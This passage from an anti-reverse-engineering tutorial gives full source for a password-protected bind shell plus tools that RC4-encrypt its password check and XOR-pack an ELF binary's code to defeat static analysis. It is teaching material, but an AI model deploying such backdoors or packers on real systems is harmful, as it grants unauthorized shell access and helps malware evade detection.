0 NOTYPE GLOBAL DEFAULT ABS check_password_size\n\n##### Both the sections headers table and the symbol say that the check_password() is 0x107 bytes long. That sounds about right. Let’s move on.\n\n#### Decryption Logic\n\n##### You’ll start off by adding the decryption logic to Trouble. First you’ll need to add in the crypto. You’ll be using a popular open source implementation of RC4 that is licensed under the simplified BSD license.\n\n###### chap_4_static_analysis/dontpanic/trouble/src/rc.h\n\n/*\n\n - rc4.h\n \n - Copyright (c) 1996-2000 Whistle Communications, Inc.\n\n - All rights reserved.\n \n - Subject to the following obligations and disclaimer of warranty, use and\n\n - redistribution of this software, in source or object code forms, with or\n\n - without modifications are expressly permitted by Whistle Communications;\n\n - provided, however, that:\n\n - 1. Any and all reproductions of the source or object code must include the\n - copyright notice above and the following disclaimer of warranties; and\n\n - 2. No rights are granted, in any manner or form, to use Whistle\n - Communications, Inc. trademarks, including the mark \"WHISTLE\n - COMMUNICATIONS\" on advertising, endorsements, or otherwise except as\n - such appears in the above copyright notice or in the software.\n \n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 148\n\n - THIS SOFTWARE IS BEING PROVIDED BY WHISTLE COMMUNICATIONS \"AS IS\", AND\n\n - TO THE MAXIMUM EXTENT PERMITTED BY LAW, WHISTLE COMMUNICATIONS MAKES NO\n\n - REPRESENTATIONS OR WARRANTIES, EXPRESS OR IMPLIED, REGARDING THIS SOFTWARE,\n\n - INCLUDING WITHOUT LIMITATION, ANY AND ALL IMPLIED WARRANTIES OF\n\n - MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, OR NON-INFRINGEMENT.\n\n - WHISTLE COMMUNICATIONS DOES NOT WARRANT, GUARANTEE, OR MAKE ANY\n\n - REPRESENTATIONS REGARDING THE USE OF, OR THE RESULTS OF THE USE OF THIS\n\n - SOFTWARE IN TERMS OF ITS CORRECTNESS, ACCURACY, RELIABILITY OR OTHERWISE.\n\n - IN NO EVENT SHALL WHISTLE COMMUNICATIONS BE LIABLE FOR ANY DAMAGES\n\n - RESULTING FROM OR ARISING OUT OF ANY USE OF THIS SOFTWARE, INCLUDING\n\n - WITHOUT LIMITATION, ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY,\n\n - PUNITIVE, OR CONSEQUENTIAL DAMAGES, PROCUREMENT OF SUBSTITUTE GOODS OR\n\n - SERVICES, LOSS OF USE, DATA OR PROFITS, HOWEVER CAUSED AND UNDER ANY\n\n - THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n\n - (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF\n\n - THIS SOFTWARE, EVEN IF WHISTLE COMMUNICATIONS IS ADVISED OF THE POSSIBILITY\n\n - OF SUCH DAMAGE.\n \n - $FreeBSD: src/sys/crypto/rc4/rc4.h,v 1.2.2.1 2000/04/18 04:48:32 archie Exp $\n*/\n\n#ifndef _SYS_CRYPTO_RC4_RC4_H_\n#define _SYS_CRYPTO_RC4_RC4_H_\n\n#include <stdint.h>\n\n**struct rc4_state**\n{\n\n**uint8_t** perm[256];\n**uint8_t** index1;\n**uint8_t** index2;\n};\n\n**extern void rc4_init(struct rc4_state *state, const uint8_t *key, int keylen);**\n**extern void rc4_crypt(struct rc4_state *state, const uint8_t *inbuf, uint8_t *outbuf,\\**\n\n**int buflen);**\n\n#endif\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 149\n\n chap_4_static_analysis/dontpanic/trouble/src/rc4.c\n\n/*\n\n - rc4.c\n \n - Copyright (c) 1996-2000 Whistle Communications, Inc.\n\n - All rights reserved.\n \n - Subject to the following obligations and disclaimer of warranty, use and\n\n - redistribution of this software, in source or object code forms, with or\n\n - without modifications are expressly permitted by Whistle Communications;\n\n - provided, however, that:\n\n - 1. Any and all reproductions of the source or object code must include the\n - copyright notice above and the following disclaimer of warranties; and\n\n - 2. No rights are granted, in any manner or form, to use Whistle\n - Communications, Inc. trademarks, including the mark \"WHISTLE\n - COMMUNICATIONS\" on advertising, endorsements, or otherwise except as\n - such appears in the above copyright notice or in the software.\n \n - THIS SOFTWARE IS BEING PROVIDED BY WHISTLE COMMUNICATIONS \"AS IS\", AND\n\n - TO THE MAXIMUM EXTENT PERMITTED BY LAW, WHISTLE COMMUNICATIONS MAKES NO\n\n - REPRESENTATIONS OR WARRANTIES, EXPRESS OR IMPLIED, REGARDING THIS SOFTWARE,\n\n - INCLUDING WITHOUT LIMITATION, ANY AND ALL IMPLIED WARRANTIES OF\n\n - MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, OR NON-INFRINGEMENT.\n\n - WHISTLE COMMUNICATIONS DOES NOT WARRANT, GUARANTEE, OR MAKE ANY\n\n - REPRESENTATIONS REGARDING THE USE OF, OR THE RESULTS OF THE USE OF THIS\n\n - SOFTWARE IN TERMS OF ITS CORRECTNESS, ACCURACY, RELIABILITY OR OTHERWISE.\n\n - IN NO EVENT SHALL WHISTLE COMMUNICATIONS BE LIABLE FOR ANY DAMAGES\n\n - RESULTING FROM OR ARISING OUT OF ANY USE OF THIS SOFTWARE, INCLUDING\n\n - WITHOUT LIMITATION, ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY,\n\n - PUNITIVE, OR CONSEQUENTIAL DAMAGES, PROCUREMENT OF SUBSTITUTE GOODS OR\n\n - SERVICES, LOSS OF USE, DATA OR PROFITS, HOWEVER CAUSED AND UNDER ANY\n\n - THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n\n - (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF\n\n - THIS SOFTWARE, EVEN IF WHISTLE COMMUNICATIONS IS ADVISED OF THE POSSIBILITY\n\n - OF SUCH DAMAGE.\n \n - $FreeBSD: src/sys/crypto/rc4/rc4.c,v 1.2.2.1 2000/04/18 04:48:31 archie Exp $\n*/\n\n#include \"rc4.h\"\n#include <sys/types.h>\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 150\n\n**static __inline void**\nswap_bytes(uint8_t *a, uint8_t *b)\n{\n\n**uint8_t temp;**\n\ntemp = *a;\n*a = *b;\n*b = temp;\n}\n\n/*\n\n - Initialize an RC4 state buffer using the supplied key,\n\n - which can have arbitrary length.\n*/\n**void**\nrc4_init(struct rc4_state *const state, const uint8_t *key, int keylen)\n{\n\n**uint8_t j;**\n**int i;**\n\n/* Initialize state with identity permutation */\n**for (i = 0; i < 256; i++)**\nstate->perm[i] = (uint8_t)i;\nstate->index1 = 0;\nstate->index2 = 0;\n\n/* Randomize the permutation using key data */\n**for (j = i = 0; i < 256; i++) {**\nj += state->perm[i] + key[i % keylen];\nswap_bytes(&state->perm[i], &state->perm[j]);\n}\n}\n\n/*\n\n - Encrypt some data using the supplied RC4 state buffer.\n\n - The input and output buffers may be the same buffer.\n\n - Since RC4 is a stream cypher, this function is used\n\n - for both encryption and decryption.\n*/\n**void**\nrc4_crypt(struct rc4_state *const state,\n\n**const uint8_t *inbuf, uint8_t *outbuf, int buflen)**\n{\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 151\n\n**int i;**\n**uint8_t j;**\n\n**for (i = 0; i < buflen; i++) {**\n\n/* Update modification indicies */\nstate->index1++;\nstate->index2 += state->perm[state->index1];\n\n/* Modify permutation */\nswap_bytes(&state->perm[state->index1],\n\n&state->perm[state->index2]);\n\n/* Encrypt/decrypt next byte */\nj = state->perm[state->index1] + state->perm[state->index2];\noutbuf[i] = inbuf[i] ^ state->perm[j];\n}\n}\n\n##### You’ll need to update Trouble’s CMakeLists.txt to include rc4.c.\n\nadd_executable(${PROJECT_NAME} src/trouble.c src/rc4.c)\n\n##### Next you’ll need to update trouble.c to use RC4 decryption on check_password(). Here is the updated file.\n\n###### Updated trouble.c with RC4 decryption\n\n#include <stdio.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <string.h>\n#include <stdbool.h>\n#include <sys/mman.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n\n#include \"rc4.h\"\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 152\n\n#include \"xor_string.h\"\n\n**extern void* check_password_size;**\n**unsigned char check_password_key[128] __attribute((section(\".rc4_check_password\"))) =\\**\n{ 0 };\n\n**bool __attribute__((section(\".check_password\"))) check_password(const char* p_passwor\\**\nd)\n{\n\n**char pass[password_size] = {};**\nXOR_STRING31(pass, password, 0xaa);\n\n// validate the password\n**return memcmp(undo_xor_string(pass, 32, 0xaa), p_password, 32) != 0;**\n}\n\n/**\n\n - This implements a fairly simple bind shell. The server first requires a\n\n - password before allowing access to the shell. The password is currently\n\n - randomly generated each time 'cmake ..' is run. The server has no shutdown\n\n - mechanism so it will run until killed.\n*/\n**int main(int p_argc, char* p_argv[])**\n{\n(void)p_argc;\n(void)p_argv;\n\n**int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);**\n**if (sock == -1)**\n{\nfprintf(stderr, \"Failed to create the socket.\");\n**return EXIT_FAILURE;**\n}\n\n**struct sockaddr_in bind_addr = {};**\nbind_addr.sin_family = AF_INET;\nbind_addr.sin_addr.s_addr = htonl(INADDR_ANY);\nbind_addr.sin_port = htons(1270);\n\n**int bind_result = bind(sock, (struct sockaddr*) &bind_addr,**\n\n**sizeof(bind_addr));**\n**if (bind_result != 0)**\n{\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 153\n\nperror(\"Bind call failed\");\n**return EXIT_FAILURE;**\n}\n\n**int listen_result = listen(sock, 5);**\n**if (listen_result != 0)**\n{\nperror(\"Listen call failed\");\n**return EXIT_FAILURE;**\n}\n\n**while (true)**\n{\n\n**int client_sock = accept(sock, NULL, NULL);**\n**if (client_sock < 0)**\n{\nperror(\"Accept call failed\");\n**return EXIT_FAILURE;**\n}\n\n**int child_pid = fork();**\n**if (child_pid == 0)**\n{\n\n// read in the password\n**char password_input[password_size] = { 0 };**\n**int read_result = read(client_sock, password_input, password_size - 1);**\n**if (read_result < (int)(password_size - 1))**\n{\nclose(client_sock);\n**return EXIT_FAILURE;**\n}\n\n// decrypt valid target\n**struct rc4_state state = {};**\nmprotect(check_password, (uint64_t)&check_password_size, PROT_READ | PROT\\\n_WRITE | PROT_EXEC);\nrc4_init(&state, check_password_key, sizeof(check_password_key));\nrc4_crypt(&state, (unsigned char*)check_password, (unsigned char*)check_p\\\nassword,\n(uint64_t)&check_password_size);\nmprotect(check_password, (uint64_t)&check_password_size, PROT_READ | PROT\\\n_EXEC);\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 154\n\n**if (check_password(password_input))**\n{\nclose(client_sock);\n**return EXIT_FAILURE;**\n}\n\ndup2(client_sock, 0);\ndup2(client_sock, 1);\ndup2(client_sock, 2);\n\n**char* empty[] = { NULL };**\n**char binsh[] = { '/', 'b', 'i', 'n', '/', 's', 'h', 0 };**\nexecve(binsh, empty, empty);\nclose(client_sock);\n**return EXIT_SUCCESS;**\n}\n\nclose(client_sock);\n}\n}\n\n##### The big change in Trouble is the decryption of check_password() right before it is executed. Also, note that another section has been declared:\n\n**unsigned char check_password_key[128] __attribute((section(\".rc4_check_password\"))) =\\**\n{ 0 };\n\n##### This section will contain the key that check_password() has been encrypted with.\n\n#### Encryption Logic\n\n##### You’ve added the RC4 decryption logic to Trouble. Now you need to add RC4 encryption logic. You won’t encrypt check_password() until after Trouble has been compiled. I’ve written a tool called encryptFunctions that takes in an ELF binary and encrypts the functions. You can find the tool in the chapter four directory. The tool works by looking for a section that starts with “.rc4”. It will then match the\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 155\n\n##### “.rc4” section with a section to encrypt. For example, the sections you added to Trouble: .rc4_check_password and .check_password. The tool will store a randomly generated key in the .rc4_check_password section and RC4 encrypt the .check_pass- word section. The encryptFunctions project is made up of four files: CMakeLists.txt, encryptFunctions.cpp, rc4.c, and rc4.h (note that the rc4 files were listed earlier in this chapter).\n\n###### chap_4_static_analysis/dontpanic/encryptFunctions/CMakeLists.txt\n\nproject(encryptFunctions CXX)\ncmake_minimum_required(VERSION 2.6)\n\nset(CMAKE_CXX_FLAGS \"-Wall -Wextra -g -std=c++11\")\n\nadd_executable(${PROJECT_NAME} src/encryptFunctions.cpp src/rc4.c)\n\nset_source_files_properties(src/rc4.c PROPERTIES LANGUAGE CXX)\n\n###### chap_4_static_analysis/dontpanic/encryptFunctions/src/encryptFunctions.cpp\n\n#include <cstdlib>\n#include <iostream>\n#include <fstream>\n#include <iomanip>\n#include <cstring>\n#include <random>\n#include <elf.h>\n#include <map>\n\n#include \"rc4.h\"\n\n/**\n\n - This tool will search through a binaries section table and look for\n\n - specially named section. Specifically, any section whose name that starts\n\n - with \".rc4_*\" will be marked as a location to store a 128 byte key and the\n\n - section named by the \"*\" in \".rc4_*\" will be encrypted using rc4.\n*/\n\n/**\n\n - This function finds the special \".rc4_\" section, generates a key, and\n\n - encrypts the specified section.\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 156\n\n \n - \\param[in,out] p_data the ELF binary\n\n - \\return true on success and false otherwise\n*/\n**bool encrypt_functions(std::string& p_data)**\n{\n\n**if (p_data[0] != 0x7f || p_data[1] != 'E' || p_data[2] != 'L' || p_data[3] != 'F')**\n{\n\n**return false;**\n}\n\nElf64_Ehdr* ehdr = reinterpret_cast<Elf64_Ehdr*>(&p_data[0]);\nElf64_Shdr* sections = reinterpret_cast<Elf64_Shdr*>(&p_data[ehdr->e_shoff]);\nElf64_Half sections_count = ehdr->e_shnum;\nElf64_Shdr* strings_header = reinterpret_cast<Elf64_Shdr*>(&p_data[ehdr->e_shoff]\\\n+\n\n(ehdr->e_shentsize * ehdr->e_shstrndx));\n**const char* strings_table = &p_data[strings_header->sh_offset];**\n\nstd::map<std::string, Elf64_Addr> encrypt_mappings;\n\n// find all \".rc4_\" sections.\nElf64_Shdr* current = sections;\n**for (int i = 0; i < sections_count; i++, current++)**\n{\nstd::string section_name(&strings_table[current->sh_name]);\n**if (section_name.find(\".rc4_\") == 0)**\n{\n\n// store the other half of the section name to find where to encrypt\nstd::string func_name = \".\" + section_name.substr(5);\nencrypt_mappings[func_name] = current->sh_offset;\n}\n}\n\n// find all sections that \".rc4_*\" was referencing for encryption\ncurrent = sections;\nstd::random_device rd;\nstd::uniform_int_distribution<int> dist(0, 255);\n**for (int i = 0; i < sections_count; i++, current++)**\n{\nstd::string section_name(&strings_table[current->sh_name]);\n**if (encrypt_mappings.find(section_name) != encrypt_mappings.end())**\n{\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 157\n\n// randomly generate a key to encrypt with\n**unsigned char key[128] = { 0 };**\n**for (std::size_t i = 0; i < sizeof(key); i++)**\n{\nkey[i] = dist(rd);\n}\n\n// encrypt the section\n**struct rc4_state state = {};**\nrc4_init(&state, key, sizeof(key));\nrc4_crypt(&state, reinterpret_cast<unsigned char*>(&p_data[current->sh_of\\\nfset]),\n\n**reinterpret_cast<unsigned char*>(&p_data[current->sh_offset]),**\ncurrent->sh_size);\nmemcpy(&p_data[encrypt_mappings[section_name]], key, sizeof(key));\nstd::cout << \"[+] Encrypted 0x\" << std::hex << current->sh_offset << std:\\\n:endl;\n}\n}\n\n**return true;**\n}\n\n**int main(int p_argc, char** p_argv)**\n{\n\n**if (p_argc != 2)**\n{\nstd::cerr << \"Usage: ./encryptFunctions <file path>\" << std::endl;\n**return EXIT_FAILURE;**\n}\n\nstd::ifstream inputFile(p_argv[1], std::ifstream::in | std::ifstream::binary);\n**if (!inputFile.is_open() || !inputFile.good())**\n{\nstd::cerr << \"Failed to open the provided file: \" << p_argv[1] << std::endl;\n**return EXIT_FAILURE;**\n}\n\nstd::string input((std::istreambuf_iterator<char>(inputFile)), std::istreambuf_it\\\nerator<char>());\ninputFile.close();\n\n**if (!encrypt_functions(input))**\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 158\n\n{\nstd::cerr << \"Failed to complete the encryption function\" << std::endl;\n**return EXIT_FAILURE;**\n}\n\nstd::ofstream outputFile(p_argv[1], std::ofstream::out | std::ofstream::binary);\n**if (!outputFile.is_open() || !outputFile.good())**\n{\nstd::cerr << \"Failed to wopen the provided file: \" << p_argv[1] << std::endl;\n**return EXIT_FAILURE;**\n}\n\noutputFile.write(input.data(), input.length());\noutputFile.close();\n\n**return EXIT_SUCCESS;**\n}\n\n##### In order to use encryptFunctions, you’ll need to update the CMakeLists.txt in the base “dontpanic” directory. It should look like this.\n\n###### Don’t Panic’s CMakeList.txt\n\nproject(dontpanic C)\ncmake_minimum_required(VERSION 3.0)\n\nadd_subdirectory(encryptFunctions)\nadd_subdirectory(trouble)\n\n##### Then update Trouble’s CMakeList.txt to include execution of encryptFunctions:\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 159\n\n Updating Trouble’s CMakeList.txt\n\nproject(trouble C)\ncmake_minimum_required(VERSION 3.0)\n\n# This will create a 32 byte \"password\" for the bind shell. This command\n# is only run when \"cmake\" is run, so if you want to generate a new password\n# then \"cmake ..; make\" should be run from the command line.\nexec_program(\"/bin/sh\"\n\n${CMAKE_CURRENT_SOURCE_DIR}\nARGS \"-c 'cat /dev/urandom | tr -dc a-zA-Z0-9 | head -c 32'\"\nOUTPUT_VARIABLE random_password )\n\n# Pass the random password into ${PROJECT_NAME} as a macro\nadd_definitions(-Dpassword=\"${random_password}\" -Dpassword_size=33)\n\nset(CMAKE_C_COMPILER musl-gcc)\nset(CMAKE_C_FLAGS \"-Wall -Wextra -Wshadow -O3 -static -std=gnu11\")\nadd_executable(${PROJECT_NAME} src/trouble.c src/rc4.c)\n\nadd_custom_target(addLDS\n\nCOMMAND sed -i -e 's,-o,${CMAKE_CURRENT_SOURCE_DIR}/trouble_layout.\\\nlds -o,g' ./CMakeFiles/trouble.dir/link.txt)\n\nadd_dependencies(${PROJECT_NAME} addLDS)\n\n# After the build is successful, display the random password to the user\nadd_custom_command(TARGET ${PROJECT_NAME} POST_BUILD\n\nCOMMAND ${CMAKE_COMMAND} -E echo\n\"The bind shell password is:\" ${random_password})\n\nadd_custom_command(TARGET ${PROJECT_NAME}\n\nPOST_BUILD\nCOMMAND ../encryptFunctions/encryptFunctions ${CMAKE_CURRENT_BINAR\\\nY_DIR}/${PROJECT_NAME})\n\n##### Finally! You can recompile Trouble. There should be extra output associated with the encryption of check_password().\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 160\n\n Rebuilding Trouble with encryptFunctions\n\nalbino-lobster@ubuntu:~/antire_book/chap_4_static_analysis/dontpanic/build$ make\n-- Configuring done\n-- Generating done\n-- Build files have been written to: /home/albino-lobster/antire_book/chap_4_static_a\\\nnalysis/dontpanic/build\n\n[ 20%] Built target stripBinary\n\n[ 40%] Built target fakeHeadersXBit\nScanning dependencies of target encryptFunctions\n\n[ 50%] Building CXX object encryptFunctions/CMakeFiles/encryptFunctions.dir/src/encry\\\nptFunctions.cpp.o\n\n[ 60%] Building CXX object encryptFunctions/CMakeFiles/encryptFunctions.dir/src/rc4.c\\\n.o\n\n[ 70%] Linking CXX executable encryptFunctions\n\n[ 70%] Built target encryptFunctions\n\n[ 70%] Built target addLDS\nScanning dependencies of target trouble\n\n[ 80%] Building C object trouble/CMakeFiles/trouble.dir/src/trouble.c.o\n\n[ 90%] Building C object trouble/CMakeFiles/trouble.dir/src/rc4.c.o\n\n[100%] Linking C executable trouble\nThe bind shell password is: tS5MOaog4uurRWn0Lxo4K6CF9YnWIR5V\n\n[+] Encrypted 0x2310\n\n[100%] Built target trouble\n\n##### Now for the fun part. Let’s check out how check_password() looks in a disassembler.\n\n###### Encrypted check_password() in Radare2\n\nalbino-lobster@ubuntu:~/antire_book/chap_4_static_analysis/dontpanic/build$ radare2 .\\\n/trouble/trouble\nWarning: Cannot initialize dynamic strings\n-- Welcome to \"IDA - the roguelike\"\n\n[0x004003b0]> aaa\n\n[x] Analyze all flags starting with sym. and entry0 (aa)\n\n[x] Analyze len bytes of instructions for references (aar)\n\n[x] Analyze function calls (aac)\n\n[ ] [*] Use -AA or aaaa to perform additional experimental analysis.\n\n[x] Constructing a function name for fcn.* and sym.func.* functions (aan))\n\n[0x004003b0]> pdf @ sym.check_password\n;-- section..check_password:\n/ (fcn) sym.check_password 41\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 161\n\n| sym.check_password ();\n| ; CALL XREF from 0x004002f3 (unk)\n| ; DATA XREF from 0x004002a0 (unk)\n| ; DATA XREF from 0x004002c3 (unk)\n| ; DATA XREF from 0x004002e1 (unk)\n| 0x00402310 e6cf out 0xcf, al\n| 0x00402312 6c insb byte [rdi], dx\n| 0x00402313 f394 xchg eax, esp\n| 0x00402315 15962bbb6f adc eax, 0x6fbb2b96\n| 0x0040231a 5c pop rsp\n| 0x0040231b de3da92ac6e0 fidivr word [0xffffffffe1064dca]\n| 0x00402321 a2bd0a32467d. movabs byte [0xdc41317d46320abd], al\n| 0x0040232a 2462 and al, 0x62\n| 0x0040232c b60d mov dh, 0xd\n| 0x0040232e 5d pop rbp\n| 0x0040232f b6ac mov dh, 0xac\n| 0x00402331 383d5907d68c cmp byte [0xffffffff8d162a90], bh ; [0x4:1]=2\n**\\** 0x00402337 02c7 add al, bh\n\n##### Radare2 does produce disassembly for check_pasword(), but its totally useless. Pretty good for just trying to hide a string, huh? Encrypting the function has other benefits that will make runtime and memory analysis more difficult. We’ll cover that in later chapters. Remember though, just because you encrypted the function doesn’t mean a reverse engineer isn’t going to decrypt it. The following disassembly obviously doesn’t have the symbols stripped, but you can see that a reverse engineer would be able to discover all the elements to do the decryption.\n\n###### Disassembly around check_password()\n\n.text:000000000040028F mov edx, 7\n.text:0000000000400294 mov esi, 107h\n.text:0000000000400299 rep stosq\n.text:000000000040029C mov eax, ebp\n.text:000000000040029E stosw\n.text:00000000004002A0 mov edi, offset check_password\n.text:00000000004002A5 call mprotect\n.text:00000000004002AA lea rdi, [rsp+188h+var_168]\n.text:00000000004002AF mov edx, 80h\n.text:00000000004002B4 mov esi, offset check_password_key\n.text:00000000004002B9 call rc4_init\n.text:00000000004002BE mov eax, 107h\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 162\n\n.text:00000000004002C3 mov edx, offset check_password\n.text:00000000004002C8 lea rdi, [rsp+188h+var_168]\n.text:00000000004002CD lea ecx, [rax]\n.text:00000000004002CF mov rsi, rdx\n.text:00000000004002D2 call rc4_crypt\n.text:00000000004002D7 mov edx, 5\n.text:00000000004002DC mov esi, 107h\n.text:00000000004002E1 mov edi, offset check_password\n.text:00000000004002E6 call mprotect\n.text:00000000004002EB lea rdi, [rsp+188h+var_48]\n.text:00000000004002F3 call check_password\n\n### Creating a Cryptor\n\n##### As you saw at the end of the previous chapter, a reverse engineer doing static analysis can recover all the variables they need to decrypt check_password() by looking at the disassembly right before the call to check_password(). Is is possible to prevent that? The answer is always ultimately no. You really can’t prevent it. However, you can make it more difficult. Let’s write a cryptor to encrypt more of the binary!\n\n### What’s a Cryptor?\n\n###### A cryptor encrypts a binary and adds additional logic to decrypt the binary at runtime. A couple open source examples are:\n\n 1. cryptelf⁴⁴ 2. midgetpack⁴⁵\n\n Similar to a cryptor, a packer compresses the binary. The most widely used cryptor is UPX[ˆupx].\n\n ⁴⁴https://dl.packetstormsecurity.net/crypt/linux/cryptelf.c ⁴⁵https://github.com/arisada/midgetpack\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 163\n\n#### Implementing the Cryptor\n\n##### To keep things simple, I’ve written a cryptor that only encrypts the binary’s code. That means that the data will remain unencrypted. Also, the “encryption algorithm” that I’ve used is a one byte xor. Which is not encryption at all, but an obfuscation. I’ve chosen these limitations to keep the cryptor and the assembly stub it adds to the binary as simple as possible. Once you understand how this simple cryptor works you can start expanding it.\n\n You can find the code in the chapter four in the cryptor directory. As usual, the project contains two files: CMakeLists.txt and cryptor.cpp.\n\n###### chap_4_static_analysis/dontpanic/cryptor/CMakeLists.txt\n\nproject(cryptor CXX)\ncmake_minimum_required(VERSION 3.0)\n\nset(CMAKE_CXX_FLAGS \"-Wall -Wextra -g\")\n\nadd_executable(${PROJECT_NAME} src/cryptor.cpp)\n\n###### chap_4_static_analysis/dontpanic/cryptor/src/cryptor.cpp\n\n#include <cstdlib>\n#include <iostream>\n#include <fstream>\n#include <iomanip>\n#include <cstring>\n#include <elf.h>\n\n/**\n\n - This tool implements a *very* simple cryptor. The \"encryption\" scheme is just\n\n - a one by XOR. Obviously, this isn't something you'd use to truly protect\n\n - a binary, but it is a interesting tool to begin to understand how cryptors\n\n - work.\n \n - This tool will \"encrypt\" only the PF_X segment. Which means that .data is\n\n - left visible.\n*/\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 164\n\n/**\n\n - Adds the decryption stub to the end of the first PF_X segment. Rewrites the\n\n - entry_point address and xor \"encrypts\" the PF_X segment from just after the\n\n - program headers to the end of the segment.\n \n - \\param[in,out] p_data the ELF binary\n\n - \\return true on success and false otherwise\n*/\n**bool add_cryptor(std::string& p_data)**\n{\n\n**if (p_data[0] != 0x7f || p_data[1] != 'E' || p_data[2] != 'L' ||**\n\np_data[3] != 'F')\n{\nstd::cerr << \"[-] Bad magic\" << std::endl;\n**return 0;**\n}\n\nElf64_Ehdr* ehdr = reinterpret_cast<Elf64_Ehdr*>(&p_data[0]);\nElf64_Phdr* phdr = reinterpret_cast<Elf64_Phdr*>(&p_data[ehdr->e_phoff]);\n**int ph_entries = ehdr->e_phnum;**\n\n**const Elf64_Phdr* segment = NULL;**\n**for (int i = 0; i < ph_entries && segment == NULL; i++, phdr++)**\n{\n\n**if (phdr->p_type == PT_LOAD && phdr->p_flags & PF_X)**\n{\n\n// in order to write to the PF_X segment, we'll set the write\n// flag. However, a more elagant solution is to use mprotect\n// in the decryption stub.\nphdr->p_flags |= PF_W;\nsegment = phdr;\n}\n}\n\n**if (segment == NULL)**\n{\nstd::cerr << \"[-] Couldn't find an executable segment.\" << std::endl;\n**return false;**\n}\n\n// We can't encrypt the ELF header or the program headers or we'll break the\n// loader. So begin encryption right after the program headers. This logic\n// asumes that the ELF header and the program headers fall within the\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 165\n\n// segment variable\n**uint32_t encrypt_start = ehdr->e_phoff** + (ehdr->e_phentsize * ehdr->e_phnum);\n**uint32_t virt_start = segment->p_vaddr + encrypt_start;**\n\n// store the real offset so we can overwrite it with the stubs address.\n**uint32_t actual = ehdr->e_entry;**\n\n// this is sneaky in that *technically* speaking we'll be writing the stub\n// into address space outside of the range specified by the program header\n// BUT! In the real world, the address space is going to be page aligned\n// so as long as we can fit our stub between the end of the PF_X segment\n// and the end of the page, we are fine. We *could* just update the\n// segment to include the size of the stub, but IDA gets upset when we\n// rely on the page alignment\nehdr->e_entry = segment->p_vaddr + segment->p_filesz;\n\n// this is our decryption logic. Very simple. Very small.\n**unsigned char stub[] =**\n\n\"\\x48\\xC7\\xC5\\xFF\\xEE\\xDD\\x00\" // mov rbp, 0DDEEFFh <-- virt_start\n\"\\x49\\xC7\\xC1\\xCC\\xBB\\xAA\\x00\" // mov r9, 0AABBCCh <-- e_entry\n\"\\x49\\xC7\\xC0\\xAA\\x00\\x00\\x00\" // mov r8, 0AAh\n\"\\x4C\\x31\\x45\\x00\" // xor [rbp+var_s0], r8\n\"\\x4C\\x8B\\x45\\x00\" // mov r8, [rbp+var_s0]\n\"\\x48\\xFF\\xC5\" // inc rbp\n\"\\x4C\\x39\\xCD\" // cmp rbp, r9\n\"\\x7C\\xE9\" // jl short loop\n\"\\x48\\xC7\\xC5\\x19\\x03\\x40\\x00\" // mov rbp, 400319h <-- actual\n\"\\xFF\\xE5\"; // jmp rbp\n\n// This is a very basic check to ensure we aren't overwriting page\n// boundaries. However, note that the value I'm using (4096) is what is good\n// for *my* system. 4096 is a very common page size but your mileage may\n// vary.\n**int lower_bound = (encrypt_start + segment->p_filesz) % 4096;**\n**int upper_bound = (encrypt_start + segment->p_filesz + sizeof(stub)) % 4096;**\n**if (lower_bound > upper_bound)**\n{\nstd::cerr << \"[-] Stub cross page boundaries\" << std::endl;\n**return false;**\n}\n\n// replace the values in the assembly with real values\nmemcpy(stub + 3, &virt_start, 4);\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 166\n\nmemcpy(stub + 10, &ehdr->e_entry, 4);\nmemcpy(stub + 40, &actual, 4);\n\n// copy the stub into the binary\nmemcpy(&p_data[segment->p_filesz], stub, sizeof(stub));\n\n// \"encrypt\" the binary\n**char xorValue = 0xaa;**\n**for (uint32_t i = encrypt_start; i < segment->p_filesz; i++)**\n{\np_data[i] ^= xorValue;\n}\n\n**return true;**\n}\n\n**int main(int p_argc, char** p_argv)**\n{\n\n**if (p_argc != 2)**\n{\nstd::cerr << \"Usage: ./cryptor <file path>\" << std::endl;\n**return EXIT_FAILURE;**\n}\n\nstd::ifstream inputFile(p_argv[1], std::ifstream::in | std::ifstream::binary);\n**if (!inputFile.is_open() || !inputFile.good())**\n{\nstd::cerr << \"Failed to open the provided file: \" << p_argv[1] << std::endl;\n**return EXIT_FAILURE;**\n}\n\nstd::string input((std::istreambuf_iterator<char>(inputFile)), std::istreambuf_it\\\nerator<char>());\ninputFile.close();\n\n**if(!add_cryptor(input))**\n{\n\n**return EXIT_FAILURE;**\n}\n\nstd::ofstream outputFile(p_argv[1], std::ofstream::out | std::ofstream::binary);\n**if (!outputFile.is_open() || !outputFile.good())**\n{\n\n\n-----\n\n###### Chapter 4: Fighting Off String Analysis 167\n\nstd::cout << \"Failed to wopen the provided file: \" << p_argv[1] << std::endl;\n**return EXIT_FAILURE;**\n}\n\noutputFile.write(input.data(), 